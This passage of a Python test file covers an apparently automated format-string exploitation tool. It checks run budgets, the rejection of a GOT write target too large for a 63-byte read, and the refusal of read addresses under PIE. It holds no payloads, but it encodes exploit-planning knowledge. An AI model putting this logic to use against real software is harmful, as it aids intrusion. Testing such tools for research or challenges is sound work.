    # An exhausted budget returns empty output rather than spawning anything.
    out, rc = fmtstr_probe._deliver(path, [b"x\n"], budget=budget)
    assert out == b"" and budget.runs == 2


def test_unreachable_write_target_is_marked_rather_than_offered(read_facts):
    """05's ``fflush@got`` is real but needs 64 bytes through a 63-byte read."""
    fs = read_facts.fmtstr
    got = [t for t in fs.write_targets if t.kind == "got"]
    assert got, "the GOT candidate should still be NAMED"
    assert all(not t.fits_budget for t in got)
    assert all(t.budget_note for t in got)
    assert fs.usable_write_targets == ()
    # And therefore the family must not route 05 to the write.
    assert fmtstr.propose(read_facts).name == fmtstr.ARBREAD


def test_read_demo_address_is_refused_under_pie():
    """A link-time section offset is not a runtime address; %s on it segfaults."""

    class _Section:
        address = 0x318

    class _Binary:
        sections = {".interp": _Section()}

        def read(self, address, size):
            return b"/lib64/ld-linux-x86-64.so.2\x00"

    assert fmtstr_probe.pick_read_demo_address(_Binary(), pie=True) == (None, None)
    address, text = fmtstr_probe.pick_read_demo_address(_Binary(), pie=False)
    assert address == 0x318 and text.startswith("/lib64/")
